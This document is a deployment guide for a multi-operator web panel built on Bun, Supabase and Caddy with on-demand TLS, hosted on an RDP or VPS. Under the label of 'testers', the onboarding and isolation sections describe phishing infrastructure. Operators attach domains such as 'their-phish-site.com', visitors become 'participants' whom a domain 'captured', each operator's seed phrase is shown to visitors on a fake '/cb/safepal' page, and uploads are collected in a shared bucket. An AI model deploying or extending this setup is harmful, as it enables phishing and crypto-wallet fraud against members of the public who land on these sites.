# Deploying the panel on an RDP / VPS

This app is a TanStack Start server. You run it on your RDP (Windows, but do
this inside WSL2 Ubuntu, or a dedicated Linux VPS) as a normal Node/Bun
process behind a Caddy reverse proxy. Any hostname the reverse proxy
forwards to the app becomes a "tester domain" as soon as a tester attaches
it in Settings → My domains — the app resolves the tenant from the incoming
`Host` header, so no per-domain config file is needed.

Only 3 people (the testers you create in the admin panel) can sign in.
Nobody else can register — the `/auth` route offers sign-in only after the
first admin exists, and the account creator lives inside `/admin` behind
the role check.

---

## 1. Prerequisites

- Ubuntu 22.04+ on the RDP (or WSL2 Ubuntu on Windows Server). Everything
  below assumes a shell on that Linux side.
- A domain you control for the panel itself, e.g. `panel.example.com`.
- The public IP of the RDP.
- Ports **80** and **443** open in the RDP firewall + Windows Defender +
  your cloud provider's security group. Port **22** open for SSH.
- Install once:
  ```bash
  sudo apt update
  sudo apt install -y curl git ufw fail2ban unzip debian-keyring debian-archive-keyring apt-transport-https
  curl -fsSL https://bun.sh/install | bash
  # log out / back in so ~/.bun/bin is on PATH

  # Caddy (used instead of nginx + certbot — handles on-demand TLS automatically)
  curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' \
    | sudo gpg --dearmor -o /usr/share/keyrings/caddy.gpg
  echo "deb [signed-by=/usr/share/keyrings/caddy.gpg] https://dl.cloudsmith.io/public/caddy/stable/deb/debian any-version main" \
    | sudo tee /etc/apt/sources.list.d/caddy.list
  sudo apt update && sudo apt install -y caddy
  ```

## 2. Get the code + build

```bash
cd /opt
sudo git clone <YOUR REPO URL> panel
sudo chown -R $USER:$USER panel
cd panel
bun install
bun run build
```

## 3. Environment

Create `/opt/panel/.env.production` with the same Supabase values you use in
Lovable Cloud (open the app in Lovable, click **View Backend** to get them):

```
SUPABASE_URL=https://<your-project>.supabase.co
SUPABASE_PUBLISHABLE_KEY=<publishable key>
SUPABASE_SERVICE_ROLE_KEY=<service role key>
VITE_SUPABASE_URL=https://<your-project>.supabase.co
VITE_SUPABASE_PUBLISHABLE_KEY=<publishable key>
SESSION_SECRET=<32+ char random string, e.g. `openssl rand -hex 32`>
NODE_ENV=production
PORT=3000
# Public IP of this server — shown in the "Add domain" dialog and used to
# verify tester DNS records:
SERVER_PUBLIC_IP=<your.server.ip.here>
# Panel hostname — used to refuse Caddy on-demand cert issuance for the
# panel's own host (regular auto-TLS handles that):
PANEL_HOST=panel.example.com
```

Never commit this file. `chmod 600 .env.production`.

## 4. Run it under a supervisor

Simplest option — systemd:

```bash
sudo tee /etc/systemd/system/panel.service <<'EOF'
[Unit]
Description=Molly panel
After=network.target

[Service]
Type=simple
WorkingDirectory=/opt/panel
EnvironmentFile=/opt/panel/.env.production
ExecStart=/home/YOURUSER/.bun/bin/bun run start
Restart=always
RestartSec=3
User=YOURUSER

[Install]
WantedBy=multi-user.target
EOF

sudo systemctl daemon-reload
sudo systemctl enable --now panel
sudo systemctl status panel
```

`bun run start` serves the built app on `PORT=3000`.

## 5. Caddy reverse proxy (with on-demand TLS)

Caddy replaces nginx + certbot. It auto-issues Let's Encrypt certs, and for
tester-attached domains it uses **on-demand TLS** — a cert is fetched the
first time anyone visits the hostname over HTTPS, provided the panel
approves the domain via the `/api/public/caddy-ask` endpoint. You never
run a per-domain command.

Write `/etc/caddy/Caddyfile`:

```caddy
{
    # Ask the panel before issuing a cert for any unknown hostname.
    # Panel returns 200 if the hostname is attached in tenant_domains, 404 otherwise.
    on_demand_tls {
        ask http://127.0.0.1:3000/api/public/caddy-ask
    }
    email you@example.com
}

# --- Panel host: regular auto-TLS ---
panel.example.com {
    reverse_proxy 127.0.0.1:3000
}

# --- Every tester-attached domain: on-demand TLS ---
:443 {
    tls {
        on_demand
    }

    # /admin and /auth are panel-only — refuse from tester domains.
    @panel_paths path /admin* /auth*
    respond @panel_paths 404

    reverse_proxy 127.0.0.1:3000
}

# --- Plain HTTP: redirect everything to HTTPS ---
:80 {
    redir https://{host}{uri} permanent
}
```

Load it:

```bash
sudo systemctl enable --now caddy
sudo systemctl reload caddy
sudo journalctl -u caddy -f   # watch for cert issuance
```

## 6. TLS

Nothing to do — Caddy handles it.

- Panel host: cert issued the first time you hit `https://panel.example.com`.
- Tester hosts: cert issued on-demand when the first visitor lands on the
  hostname over HTTPS. The panel's `caddy-ask` endpoint gates this — an
  attacker pointing DNS at your box gets a 404 from the ask endpoint and
  therefore no cert.

Renewals happen automatically in the background.

## 7. Firewall + intrusion hardening

```bash
sudo ufw allow OpenSSH
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw --force enable

# fail2ban ships with SSH jail enabled by default. Keep it on.
sudo systemctl enable --now fail2ban
```

Disable password SSH once you've added your public key
(`~/.ssh/authorized_keys`): edit `/etc/ssh/sshd_config` → set
`PasswordAuthentication no`, then `sudo systemctl restart ssh`.



## 8. First admin & tester onboarding

1. Point `panel.example.com` DNS `A` record → RDP IP.
2. Visit `https://panel.example.com/auth`. Because zero admins exist, the
   form is in **setup** mode — pick your admin username + a strong
   password. That's the only chance the setup path opens; it locks itself
   afterwards.
3. Sign in → you land in `/admin`. Open **Settings → Accounts → Create
   account**. Role = **Tester**. Repeat for all 3 testers.
4. Give each tester their credentials out-of-band.
5. Tester signs in, goes to **Settings → My domains**, adds a hostname
   (e.g. `their-phish-site.com`). The panel shows the exact A record to
   create.
6. Tester points that hostname's DNS `A` record → your RDP IP (shown in
   the panel).
7. Tester clicks **Recheck**; DNS badge flips to green within a minute.
8. Tester opens `https://their-phish-site.com` in a private tab. First
   hit takes ~2–5s while Caddy fetches the cert; SSL badge flips to
   green on the next Recheck. No SSH, no certbot — the panel's
   `caddy-ask` endpoint gates issuance automatically.
9. Tester goes to **Settings → My seed phrase**, saves their 12/24-word
   phrase. Every visitor on their attached domains now sees that phrase on
   `/cb/safepal`; the participant shows up ONLY in that tester's admin
   panel — not in the other testers'.

## 9. Ongoing

- Update the app: `cd /opt/panel && git pull && bun install && bun run build && sudo systemctl restart panel`
- Logs: `sudo journalctl -u panel -f`
- Backups: use **View Backend → Advanced settings → Export data** in
  Lovable Cloud on a schedule, or store the export offline yourself.
- If you ever suspect a tester leaked their password: admin → Settings →
  Accounts → Edit → set a new password. The old session is kicked
  automatically by the single-session watcher.

---

## What isolates the testers, technically

- **Domain → owner mapping** lives in `tenant_domains` (row: `hostname`,
  `owner_id`). The app resolves the visitor's `Host` header against this
  table on the first heartbeat and stamps `participants.owner_id`. That
  stamp never changes afterwards — a participant belongs forever to
  whoever's domain captured them.
- **Participants list** in `/admin` is served by a server function that
  filters by `owner_id = auth.uid()` unless you're the admin (who sees
  every row). RLS on the table enforces the same rule at the database
  layer.
- **Seed phrase** shown on `/cb/safepal` is fetched via
  `resolveTenantByHost(window.location.host)`; visitors on an unattached
  hostname just see the default placeholder phrase.
- **Uploads** land in the shared `file-drop` bucket but tester UIs are
  scoped to their own participant list, so cross-tester leakage requires
  guessing a UUID.
- **Sign-in** is enforced by Supabase Auth with the standard
  synthetic-email trick (`username@molly.local`); only accounts you
  created via the admin panel exist. `/auth` refuses new sign-ups once any
  admin is registered.
